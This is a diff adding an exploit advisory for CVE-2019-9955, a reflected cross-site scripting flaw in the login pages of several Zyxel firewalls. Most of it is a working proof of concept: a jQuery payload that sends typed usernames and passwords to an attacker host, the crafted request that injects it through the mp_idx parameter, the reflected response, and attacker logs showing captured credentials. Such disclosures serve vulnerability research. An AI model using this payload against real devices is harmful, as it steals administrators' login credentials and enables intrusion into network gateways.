@@ -1,0 +1,80 @@
+# Exploit Title: Reflected XSS on Zyxel login pages
+# Date: 10 Apr 2019
+# Exploit Author: Aaron Bishop
+# Vendor Homepage: https://www.zyxel.com/us/en/
+# Version: V4.31
+# Tested on: ZyWall 310, ZyWall 110, USG1900, ATP500, USG40 - weblogin.cgi, webauth_relogin.cgi
+# CVE : 2019-9955
+
+1. Description
+==============
+
+Several Zyxel devices are vulnerable to a reflected Cross-Site Scripting via the
+mp_idx parameter on weblogin.cgi and webauth_relogin.cgi.
+
+2. Proof of Concept
+=============
+
+Host a malicious file JavaScript file named 'z', or any other single character,
+locally.  The contents of 'z' for the following example are:
+
+
+-----
+$("button").click(function() {
+    $.get("//$LHOST", { username: $("input:text").val(), password: $("input:password").val(), host: location.hostname});
+});
+-----
+
+
+Close the mp_idx variable with "; and Use the getScript functionality of jQuery
+to include the malicious file: 
+
+Request:
+
+GET /?mobile=1&mp_idx=%22;$.getScript(%27//$LHOST/z%27);// HTTP/1.1
+Host: $RHOST
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+
+Response:
+
+HTTP/1.1 200 OK
+Date: Wed, 10 Apr 2019 23:13:39 GMT
+Cache-Control: no-cache, private
+Pragma: no-cache
+Expires: Mon, 16 Apr 1973 13:10:00 GMT
+Connection: close
+Content-Type: text/html
+Content-Length: 7957
+
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Welcome</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta charset="utf-8">
+	<meta http-equiv="pragma" content="no-cache">
+    <link href="/ext-js/mobile/css/jquery.mobile-1.4.2.min.css?v=180711001117" rel="stylesheet" type="text/css">
+    <link href="/ext-js/mobile/css/style.css?v=180711001117" rel="stylesheet" type="text/css">
+    <link href="/ext-js/mobile/css/theme.css?v=180711001117" rel="stylesheet" type="text/css">
+	<link rel="stylesheet" type="text/css" href="/logo/mobile_custmiz_page.css?v=180711001117" /> 
+	<script src="/ext-js/mobile/js/jquery-1.8.2.min.js?v=180711001117" type="text/javascript"></script>
+    <script src="/ext-js/mobile/js/jquery.mobile-1.4.2.min.js?v=180711001117" type="text/javascript"></script>
+	<script type="text/javascript" src="/lang/language_panel.js?v=180711001117"></script>
+<script language="JavaScript">
+	var errorNum = 0;
+	var mp_idx = "";$.getScript('//$LHOST/z');//";
+...
+
+
+When the login form is submitted, the host for the malicious file gets a request
+containing the login credentials and target system:
+
+$LHOST - - [10/Apr/2019 23:04:41] "GET /z?_=1554937481076 HTTP/1.1" 200 -
+$LHOST - - [10/Apr/2019 23:04:49] "GET /?username=test&password=test&host=$RHOST HTTP/1.1" 200 -
